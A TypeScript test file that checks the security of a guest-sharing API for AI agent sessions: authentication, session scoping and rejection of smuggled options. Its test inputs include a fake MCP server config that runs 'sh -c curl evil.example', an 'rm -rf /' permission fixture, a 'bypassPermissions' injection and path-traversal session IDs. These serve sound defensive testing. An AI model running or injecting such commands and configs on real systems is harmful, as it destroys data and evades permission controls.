// @vitest-environment node
/**
 * The guest namespace — /api/share/*.
 *
 * Every endpoint here takes its sessionId from the share token and delegates to
 * the real host handler, so these tests mock the layer *below* the routes
 * (sdk-session, codex) rather than the routes themselves. A test that stubbed
 * the delegation target would prove nothing about which session it acted on.
 */

import { Readable } from "node:stream"
import { mkdtemp, rm } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest"

const mocks = vi.hoisted(() => ({
  sdkSessions: new Map<string, unknown>(),
  persistentSessions: new Map<string, unknown>(),
  activeProcesses: new Map<string, unknown>(),
  sendSDKMessage: vi.fn(),
  resumeSDKSession: vi.fn(),
  attachSubagentWatcher: vi.fn(),
  stopSDKSession: vi.fn(),
  interruptSDKTurn: vi.fn(),
  resolvePermission: vi.fn(),
  resolveUserQuestion: vi.fn(),
  getSDKPermissions: vi.fn(),
  getSDKUserQuestions: vi.fn(),
  findJsonlPath: vi.fn(),
  getSessionMeta: vi.fn(),
  resolveSessionFilePath: vi.fn(),
  getActiveTurnId: vi.fn(),
  interruptTurn: vi.fn(),
}))

vi.mock("../../helpers", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../helpers")>()),
  sdkSessions: mocks.sdkSessions,
  persistentSessions: mocks.persistentSessions,
  activeProcesses: mocks.activeProcesses,
  getSessionMeta: mocks.getSessionMeta,
}))

vi.mock("../../sessionPaths", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../sessionPaths")>()),
  findJsonlPath: mocks.findJsonlPath,
  resolveSessionFilePath: mocks.resolveSessionFilePath,
}))

vi.mock("../../sdk-session", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../sdk-session")>()),
  sdkSessions: mocks.sdkSessions,
  sendSDKMessage: mocks.sendSDKMessage,
  resumeSDKSession: mocks.resumeSDKSession,
  attachSubagentWatcher: mocks.attachSubagentWatcher,
  isSDKQueryLive: (session: unknown) => Boolean(session),
  stopSDKSession: mocks.stopSDKSession,
  interruptSDKTurn: mocks.interruptSDKTurn,
  resolvePermission: mocks.resolvePermission,
  resolveUserQuestion: mocks.resolveUserQuestion,
  getSDKPermissions: mocks.getSDKPermissions,
  getSDKUserQuestions: mocks.getSDKUserQuestions,
}))

vi.mock("../../agents/codexAppServer", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../agents/codexAppServer")>()),
  codexAppServer: {
    getActiveTurnId: mocks.getActiveTurnId,
    interruptTurn: mocks.interruptTurn,
    listPendingApprovals: vi.fn(() => []),
    listApprovalThreadIds: vi.fn(() => []),
    respondApproval: vi.fn(),
  },
}))

import type { Middleware, UseFn } from "../../helpers"
import { registerShareGuestRoutes } from "../../routes/share-guest"
import {
  createShareToken,
  revokeShareToken,
  __resetShareTokensForTest,
} from "../../security"
import { initShareRegistry, createShare, removeShare } from "../../share/registry"

const SESSION_A = "sess-a"
const SESSION_B = "sess-b"
const DIR_NAME = "-Users-me-proj"
const FILE_NAME = "sess-a.jsonl"
const FILE_PATH = `/Users/me/.claude/projects/${DIR_NAME}/${FILE_NAME}`
const UA = "Guest/1"

const MOUNTS = [
  "/api/share/session",
  "/api/share/pending",
  "/api/share/send-message",
  "/api/share/stop",
  "/api/share/interrupt",
  "/api/share/permission",
  "/api/share/answer",
] as const

/** The mounts that read rather than act, and so answer GET. */
const GET_MOUNTS = new Set<string>(["/api/share/session", "/api/share/pending"])

let registryRoot: string

function handlers(): Map<string, Middleware> {
  const collected = new Map<string, Middleware>()
  const use: UseFn = (path, handler) => {
    collected.set(path, handler)
  }
  registerShareGuestRoutes(use)
  return collected
}

interface CallOptions {
  method?: string
  body?: unknown
  token?: string | null
  url?: string
  /** An explicit `undefined` removes the header the harness sends by default. */
  headers?: Record<string, string | undefined>
  /** Runs after the body has been streamed but before the handler sees it. */
  duringBody?: () => void | Promise<void>
  /** False when the delegated handler answers later (or never). */
  wait?: boolean
}

async function call(mount: string, options: CallOptions = {}) {
  const handler = handlers().get(mount)
  if (!handler) throw new Error(`Route was not registered: ${mount}`)

  const headers: Record<string, string> = {
    host: "cogpit.example",
    "user-agent": UA,
  }
  if (options.token !== null) {
    headers.cookie = `__Host-cogpit_share=${options.token ?? guestToken()}`
  }
  for (const [name, value] of Object.entries(options.headers ?? {})) {
    if (value === undefined) delete headers[name]
    else headers[name] = value
  }
  const payload = Buffer.from(JSON.stringify(options.body ?? {}))
  const stream = Readable.from((async function* () {
    yield payload
    await options.duringBody?.()
  })())
  const req = Object.assign(stream, {
    method: options.method ?? (GET_MOUNTS.has(mount) ? "GET" : "POST"),
    url: options.url ?? "/",
    headers,
    socket: { remoteAddress: "203.0.113.5" },
  }) as never

  let raw = ""
  let settle: () => void = () => {}
  const finished = new Promise<void>((resolve) => {
    settle = resolve
  })
  const res = {
    statusCode: 200,
    headersSent: false,
    setHeader: vi.fn(),
    end: (data?: string) => {
      res.headersSent = true
      raw = data ?? ""
      settle()
    },
  }
  const next = vi.fn(() => settle())

  await handler(req, res as never, next)
  if (options.wait !== false) await finished

  return {
    res,
    next,
    raw: () => raw,
    json: () => JSON.parse(raw) as Record<string, unknown>,
  }
}

function guestToken(sessionId = SESSION_A): string {
  return createShareToken(sessionId, "203.0.113.5", UA)
}

beforeEach(async () => {
  vi.clearAllMocks()
  mocks.sdkSessions.clear()
  mocks.persistentSessions.clear()
  mocks.activeProcesses.clear()
  registryRoot = await mkdtemp(join(tmpdir(), "cogpit-share-guest-"))
  await initShareRegistry(registryRoot)
  __resetShareTokensForTest()
  await createShare({ sessionId: SESSION_A, dirName: DIR_NAME, fileName: FILE_NAME })
  mocks.findJsonlPath.mockResolvedValue(FILE_PATH)
  mocks.resolveSessionFilePath.mockResolvedValue(FILE_PATH)
  mocks.getSessionMeta.mockResolvedValue({
    aiTitle: "Fixing the parser",
    cwd: "/Users/me/proj",
  })
  mocks.getActiveTurnId.mockReturnValue(undefined)
  mocks.sendSDKMessage.mockReturnValue({ running: true })
  mocks.stopSDKSession.mockReturnValue(true)
  mocks.interruptSDKTurn.mockResolvedValue(true)
  mocks.resolvePermission.mockReturnValue({ found: true, toolName: "Bash" })
  mocks.resolveUserQuestion.mockReturnValue({ found: true })
  mocks.getSDKPermissions.mockReturnValue([])
  mocks.getSDKUserQuestions.mockReturnValue([])
})

afterEach(async () => {
  await rm(registryRoot, { recursive: true, force: true })
})

describe("guest authentication", () => {
  it.each(MOUNTS)("401s %s without a share cookie", async (mount) => {
    const result = await call(mount, { token: null })
    expect(result.res.statusCode).toBe(401)
    expect(result.next).not.toHaveBeenCalled()
  })

  it.each(MOUNTS)("401s %s on a token that is not in the store", async (mount) => {
    const result = await call(mount, { token: "deadbeef" })
    expect(result.res.statusCode).toBe(401)
  })

  it.each(MOUNTS)("401s %s when the token is revoked before the handler runs", async (mount) => {
    const token = guestToken()
    revokeShareToken(token)

    const result = await call(mount, { token })

    expect(result.res.statusCode).toBe(401)
    expect(mocks.sendSDKMessage).not.toHaveBeenCalled()
    expect(mocks.stopSDKSession).not.toHaveBeenCalled()
  })

  it.each(MOUNTS)("401s %s for a token pinned to a different user agent", async (mount) => {
    const token = createShareToken(SESSION_A, "203.0.113.5", "Other/9")
    const result = await call(mount, { token })
    expect(result.res.statusCode).toBe(401)
  })

  it.each(MOUNTS)("401s %s replayed with no user agent at all", async (mount) => {
    // A browser-pinned cookie in curl's hands. Treating an absent header as
    // "nothing to pin against" would make the pin opt-out for the attacker.
    const result = await call(mount, { headers: { "user-agent": undefined } })
    expect(result.res.statusCode).toBe(401)
  })

  it("401s once the share itself is gone", async () => {
    const token = guestToken()
    await removeShare(SESSION_A)

    const result = await call("/api/share/session", { token })

    expect(result.res.statusCode).toBe(401)
  })

  it.each(MOUNTS)("hands the wrong method on %s back to the router", async (mount) => {
    const method = GET_MOUNTS.has(mount) ? "POST" : "GET"
    const result = await call(mount, { method })
    expect(result.next).toHaveBeenCalledOnce()
  })
})

describe("GET /api/share/session", () => {
  it("describes only the shared session", async () => {
    const result = await call("/api/share/session")

    expect(result.res.statusCode).toBe(200)
    expect(result.json()).toEqual({
      sessionId: SESSION_A,
      dirName: DIR_NAME,
      fileName: FILE_NAME,
      title: "Fixing the parser",
      provider: "claude",
    })
  })

  it("leaks no host paths, cwd or project list", async () => {
    const result = await call("/api/share/session")

    const raw = result.raw()
    expect(raw).not.toContain("/Users/me/proj")
    expect(raw).not.toContain(FILE_PATH)
    expect(result.json()).not.toHaveProperty("cwd")
    expect(result.json()).not.toHaveProperty("filePath")
    expect(result.json()).not.toHaveProperty("passwordHash")
  })

  it("ignores a sessionId in the query string", async () => {
    const result = await call("/api/share/session", { url: `/?sessionId=${SESSION_B}` })

    expect(result.json()).toMatchObject({ sessionId: SESSION_A })
  })
})

describe("GET /api/share/pending", () => {
  const PERMISSION_A = {
    requestId: "req-a",
    toolName: "Bash",
    input: { command: "rm -rf /" },
    toolUseId: "tool-a",
    title: "Run command",
    displayName: "Command execution",
    timestamp: 1,
  }
  const QUESTION_A = {
    sessionId: SESSION_A,
    toolUseId: "q-a",
    askedAt: 2,
    questions: [{ question: "Which one?", multiSelect: false, options: [] }],
  }

  it("returns the pending permissions and questions the guest may answer", async () => {
    // A guest can approve a tool call but has no other way to learn one is
    // waiting: /api/permissions and /api/user-questions are both off the
    // allowlist, session-status carries no permission data, and the transcript
    // stream carries only lines.
    mocks.sdkSessions.set(SESSION_A, {})
    mocks.getSDKPermissions.mockReturnValue([PERMISSION_A])
    mocks.getSDKUserQuestions.mockReturnValue([QUESTION_A])

    const result = await call("/api/share/pending")

    expect(result.res.statusCode).toBe(200)
    expect(result.json()).toEqual({
      // The runtime adds the fields the permission bar needs uniformly.
      permissions: [{
        ...PERMISSION_A,
        sessionId: SESSION_A,
        availableDecisions: ["allow", "allow_always", "deny"],
      }],
      questions: [QUESTION_A],
    })
  })

  it("returns empty lists when nothing is waiting", async () => {
    const result = await call("/api/share/pending")
    expect(result.json()).toEqual({ permissions: [], questions: [] })
  })

  it("reads the token's session, never a neighbouring share", async () => {
    await createShare({ sessionId: SESSION_B, dirName: DIR_NAME, fileName: "sess-b.jsonl" })
    mocks.sdkSessions.set(SESSION_A, {})
    mocks.sdkSessions.set(SESSION_B, {})
    mocks.getSDKPermissions.mockImplementation(
      (id: string) => (id === SESSION_A ? [PERMISSION_A] : []),
    )
    mocks.getSDKUserQuestions.mockImplementation(
      (id: string) => (id === SESSION_A ? [QUESTION_A] : []),
    )

    const result = await call("/api/share/pending", { token: guestToken(SESSION_B) })

    expect(mocks.getSDKPermissions).toHaveBeenCalledWith(SESSION_B)
    expect(mocks.getSDKUserQuestions).toHaveBeenCalledWith(SESSION_B)
    expect(result.json()).toEqual({ permissions: [], questions: [] })
  })

  it("ignores a sessionId in the query string", async () => {
    mocks.sdkSessions.set(SESSION_A, {})
    mocks.getSDKPermissions.mockImplementation(
      (id: string) => (id === SESSION_A ? [PERMISSION_A] : []),
    )

    const result = await call("/api/share/pending", { url: `/?sessionId=${SESSION_B}` })

    expect(mocks.getSDKPermissions).toHaveBeenCalledWith(SESSION_A)
    expect(result.json()).toMatchObject({ permissions: [PERMISSION_A] })
  })
})

describe("guest mutations act on the token's session", () => {
  beforeEach(() => {
    mocks.sdkSessions.set(SESSION_A, { running: false })
    mocks.sdkSessions.set(SESSION_B, { running: false })
  })

  it("sends a message to the shared session, not the one in the body", async () => {
    const result = await call("/api/share/send-message", {
      body: { sessionId: SESSION_B, message: "hello" },
    })

    expect(result.res.statusCode).toBe(200)
    expect(mocks.sendSDKMessage).toHaveBeenCalledTimes(1)
    expect(mocks.sendSDKMessage.mock.calls[0][0]).toBe(SESSION_A)
    expect(mocks.sendSDKMessage.mock.calls[0][1]).toBe("hello")
  })

  it("stops the shared session, not the one in the body", async () => {
    await call("/api/share/stop", { body: { sessionId: SESSION_B } })

    expect(mocks.stopSDKSession).toHaveBeenCalledWith(SESSION_A)
  })

  it("interrupts the shared session, not the one in the body", async () => {
    await call("/api/share/interrupt", { body: { sessionId: SESSION_B } })

    expect(mocks.interruptSDKTurn).toHaveBeenCalledWith(SESSION_A)
  })

  it("answers a permission request on the shared session only", async () => {
    const result = await call("/api/share/permission", {
      body: { sessionId: SESSION_B, requestId: "req-1", behavior: "allow" },
    })

    expect(result.res.statusCode).toBe(200)
    expect(mocks.resolvePermission).toHaveBeenCalledWith(SESSION_A, "req-1", "allow")
  })

  it("answers an ask-user question on the shared session only", async () => {
    const result = await call("/api/share/answer", {
      body: { sessionId: SESSION_B, toolUseId: "tool-1", answers: ["yes"] },
    })

    expect(result.res.statusCode).toBe(200)
    expect(mocks.resolveUserQuestion).toHaveBeenCalledWith(SESSION_A, "tool-1", ["yes"])
  })

  it("passes the delegated handler's own validation errors through", async () => {
    const result = await call("/api/share/permission", {
      body: { requestId: "req-1", behavior: "sudo" },
    })

    expect(result.res.statusCode).toBe(400)
    expect(mocks.resolvePermission).not.toHaveBeenCalled()
  })
})

describe("what a guest may not smuggle into a delegated call", () => {
  it("never lets a guest choose the working directory or MCP servers", async () => {
    await call("/api/share/send-message", {
      body: {
        message: "hello",
        cwd: "/etc",
        mcpConfig: { evil: { command: "sh", args: ["-c", "curl evil.example"] } },
        permissions: { mode: "bypassPermissions" },
      },
      wait: false,
    })

    await vi.waitFor(() => expect(mocks.resumeSDKSession).toHaveBeenCalledTimes(1))
    const resumed = mocks.resumeSDKSession.mock.calls[0][0] as Record<string, unknown>
    expect(resumed.sessionId).toBe(SESSION_A)
    // The cwd comes from the session's own transcript metadata.
    expect(resumed.cwd).toBe("/Users/me/proj")
    expect(resumed.mcpConfig).toBeUndefined()
    expect(resumed.permissionMode).toBeUndefined()
  })

  it("rejects a message that is neither text nor images", async () => {
    mocks.sdkSessions.set(SESSION_A, { running: false })

    const result = await call("/api/share/send-message", { body: {} })

    expect(result.res.statusCode).toBe(400)
    expect(mocks.sendSDKMessage).not.toHaveBeenCalled()
  })
})

describe("attack surface", () => {
  beforeEach(() => {
    mocks.sdkSessions.set(SESSION_A, { running: false })
    mocks.sdkSessions.set(SESSION_B, { running: false })
  })

  it("fails closed when the token is revoked while the body is still arriving", async () => {
    const token = guestToken()

    const result = await call("/api/share/send-message", {
      token,
      body: { message: "hello" },
      duringBody: () => revokeShareToken(token),
    })

    expect(result.res.statusCode).toBe(401)
    expect(mocks.sendSDKMessage).not.toHaveBeenCalled()
    expect(mocks.resumeSDKSession).not.toHaveBeenCalled()
  })

  it("fails closed when the share is turned off while the body is still arriving", async () => {
    const result = await call("/api/share/stop", {
      duringBody: async () => { await removeShare(SESSION_A) },
    })

    expect(result.res.statusCode).toBe(401)
    expect(mocks.stopSDKSession).not.toHaveBeenCalled()
  })

  it.each([
    "/api/share/send-message",
    "/api/share/stop",
    "/api/share/interrupt",
  ])("ignores a sessionId in the query string on %s", async (mount) => {
    await call(mount, {
      url: `/?sessionId=${SESSION_B}`,
      body: { message: "hello" },
    })

    for (const spy of [mocks.sendSDKMessage, mocks.stopSDKSession, mocks.interruptSDKTurn]) {
      for (const args of spy.mock.calls) expect(args[0]).toBe(SESSION_A)
    }
  })

  it("will not take the share token from an Authorization header", async () => {
    const token = guestToken()

    const result = await call("/api/share/session", {
      token: null,
      headers: { authorization: `Bearer ${token}` },
    })

    expect(result.res.statusCode).toBe(401)
  })

  it("will not take the share token from a query parameter or a custom header", async () => {
    const token = guestToken()

    const query = await call("/api/share/session", {
      token: null,
      url: `/?token=${token}`,
    })
    const header = await call("/api/share/session", {
      token: null,
      headers: { "x-cogpit-share": token },
    })

    expect(query.res.statusCode).toBe(401)
    expect(header.res.statusCode).toBe(401)
  })

  it("acts on the session its own cookie names, never a neighbouring share", async () => {
    await createShare({ sessionId: SESSION_B, dirName: DIR_NAME, fileName: "sess-b.jsonl" })

    const result = await call("/api/share/session", { token: guestToken(SESSION_B) })

    expect(result.json()).toMatchObject({ sessionId: SESSION_B, fileName: "sess-b.jsonl" })
  })

  it("cannot be steered by a sessionId that looks like a path", async () => {
    const hostile = "../../admin"
    await createShare({ sessionId: hostile, dirName: DIR_NAME, fileName: "x.jsonl" })
    mocks.sdkSessions.set(hostile, { running: false })

    const result = await call("/api/share/permission", {
      token: guestToken(hostile),
      body: { requestId: "req-1", behavior: "allow" },
    })

    expect(result.res.statusCode).toBe(200)
    expect(mocks.resolvePermission).toHaveBeenCalledWith(hostile, "req-1", "allow")
  })

  it("cannot forge a second path segment through the sessionId", async () => {
    const hostile = "sess-a/respond"
    await createShare({ sessionId: hostile, dirName: DIR_NAME, fileName: "x.jsonl" })
    mocks.sdkSessions.set(hostile, { running: false })

    const result = await call("/api/share/permission", {
      token: guestToken(hostile),
      body: { requestId: "req-1", behavior: "allow" },
    })

    expect(result.res.statusCode).toBe(200)
    expect(mocks.resolvePermission).toHaveBeenCalledWith(hostile, "req-1", "allow")
  })

  it("does not forward the guest's own cookie into the delegated request", async () => {
    // The delegated call runs past the guest boundary; a share credential
    // riding along would be a capability leak into host code.
    const seen: Array<Record<string, unknown>> = []
    mocks.sendSDKMessage.mockImplementation(() => ({ running: true }))
    const original = mocks.resumeSDKSession.getMockImplementation()
    mocks.resumeSDKSession.mockImplementation((input: Record<string, unknown>) => {
      seen.push(input)
      return {}
    })

    mocks.sdkSessions.delete(SESSION_A)
    await call("/api/share/send-message", { body: { message: "hello" }, wait: false })
    await vi.waitFor(() => expect(seen).toHaveLength(1))
    if (original) mocks.resumeSDKSession.mockImplementation(original)

    expect(JSON.stringify(seen[0])).not.toContain("__Host-cogpit_share")
  })
})
